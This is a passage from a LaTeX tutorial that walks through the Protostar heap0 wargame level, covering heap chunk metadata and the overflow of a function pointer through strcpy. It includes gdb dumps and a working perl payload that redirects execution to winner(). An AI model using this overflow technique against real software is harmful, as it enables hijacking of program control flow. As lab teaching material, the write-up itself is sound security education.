\subsection{Basics}
Consider the following program.

\lstinputlisting[language=C]{heap/heap0.c}

As is obvious, this program will allocate two structures on the heap,
point the function pointer to the \texttt{nowinner()} function,
politely tell us where both structures are located, take our
input as argument from the command line, then jump to our function pointer.
As should also be obvious by now, is that \texttt{strcpy()} does
not do bounds-checking on the input, and that this is very bad.

Running the program normally, we can see that we did not win.
We pass an argument to avoid a null pointer dereference.
\begin{lstlisting}
user@protostar:~/heap/heap0$ /opt/protostar/bin/heap0 asdf
data is at 0x804a008, fp is at 0x804a050
level has not been passed
\end{lstlisting}
Helpfully, we can see that there are \texttt{0x48} (72) bytes
from the beginning of our vulnerable buffer to the obvious target; \texttt{fp}.

However, this is the heap, so let's take a look at the memory to really get
an idea of what's happening. Remember that when displaying memory in 4-byte
chunks using the 'x' command in gdb, it will do the conversion between
big and little-endian automatically.

\begin{lstlisting}
user@protostar:~/heap/heap0$ gdb -q /opt/protostar/bin/heap0
Reading symbols from /opt/protostar/bin/heap0...done.
(gdb) b *(main+81)
Breakpoint 1 at 0x80484dd: file heap0/heap0.c, line 36.
(gdb) r asdf
Starting program: /opt/protostar/bin/heap0 asdf
data is at 0x804a008, fp is at 0x804a050

Breakpoint 1, main (argc=2, argv=0xbffff864) at heap0/heap0.c:36
(gdb) x/24x 0x0804a000
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
\end{lstlisting}

Here, we pause execution directly after the \texttt{printf} on line 36.
This way, we can easily examine the state of our allocated chunks
after they've been set up, noticing an important difference. As these
chunks are dynamically allocated, the dlmalloc/ptmalloc algorithms
require some metadata in order to manage these chunks efficiently.
To truly understand heap exploitation, you have to understand the algorithm
of the heap you are attacking. For this example, we don't necessarily
have to understand much, but this is a perfect opportunity to point out the
some of the important parts.

First, notice that we're told that our first heap structure, \texttt{d},
is located at \texttt{0x0804a008}. For all the programmer cares, this is
true. Their 64-character buffer does indeed start at \texttt{0x0804a008}.
However, within dlmalloc/ptmalloc, this chunck actually begins at 
\texttt{0x0804a000}. This is because of the \texttt{prev\_size} and
\texttt{size} fields at the beginning of each chunk which store
metadata required by dlmalloc/ptmalloc. As \texttt{prev\_size} is
not technically used on allocated chunks, these are zero.

Notice that the 4-byte int at \texttt{0x0804a004} is \texttt{0x49}.
Because of various reasons, the lowest 3
bits of \texttt{size} are used as status flags, so this actually
says that the current chunk's size is \texttt{0x48} (72) bytes, and
that the previous chunk is in use. Likewise, the function
pointer \texttt{fp} is located at the chunk beginning at
\texttt{0x0804a048}, which has a \texttt{size} of \texttt{0x11},
telling us this chunk is 16 bytes, and that the previous chunk is in use. 

Turning away from heap internals and back towards the situation at hand,
this is a straightforward buffer overflow, much like the stack ones we've
already discussed. Since we want to change \texttt{fp} to point to
\texttt{winner} instead of \texttt{nowinner}, we can simply place that
address in the function pointer.

\begin{lstlisting}
user@protostar:~/heap/heap0$ objdump -t /opt/protostar/bin/heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
user@protostar:~/heap/heap0$ cat do_heap0 && ./do_heap0
/opt/protostar/bin/heap0 `perl -e '$buf = "A"x72; print $buf."\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
\end{lstlisting}

Here, we've used a nifty bash trick by building our buffer with perl, then
printing it and using the result as our argument. As noted previously, there
were 72 bytes from the beginning of the vulnerable buffer to the beginning
of the target data, so we pad 72 bytes, then concatenate with the address
of the \texttt{winner} function in little endian. This overwrites \texttt{fp},
as is obvious from the \texttt{level passed} message.

So, what's the big difference between this and a stack-based buffer overflow?
Notice that in order to overflow to \texttt{fp}, we had to overwrite
both the \texttt{size} and \texttt{prev\_size} fields of the chunk
it belongs to. In this situation, there were no more heap manipulations
between when we attacked, at line 36, and when we got the result we
wanted, at line 38. However, it's possible that other operations, such
as a \texttt{free(f)} after our overwrite, could potentially corrupt the heap,
or crash the program. This presents an interesting situation; if overwriting
the user data the chunks store won't get us what we want, could overwriting
heap meatadata do so?
